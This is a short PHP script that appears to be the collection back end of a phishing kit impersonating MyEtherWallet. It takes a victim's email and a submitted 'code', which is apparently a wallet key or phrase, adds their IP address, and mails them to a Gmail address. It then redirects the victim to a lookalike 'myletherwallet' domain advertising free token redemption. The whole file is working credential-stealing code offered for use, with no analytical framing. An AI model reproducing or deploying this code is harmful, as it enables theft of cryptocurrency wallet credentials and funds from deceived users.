<?php
$email = $_POST['email'];
$code = $_POST['code'];
$ip = $_POST['ip'];
$ip = $_SERVER['REMOTE_ADDR'];

$formcontent=" User: $email \n $code \n  ip: $ip";
$recipient = "trend.salevip@gmail.com";
$subject = "rararara";

$mailheader = "From: $email \r\n";
mail($recipient, $subject, $formcontent, $mailheader) or die("Error!");
echo "Thank You!" . " -" . "<a href='https://myetherwallet.redeem.tokens.myletherwallet.site/Redeem-FreeZone-FRZ-Tokens-Successfully.htm'> Return Home</a>";
header("Location: https://myetherwallet.redeem.tokens.myletherwallet.site/Redeem-FreeZone-FRZ-Tokens-Successfully.htm");
?>
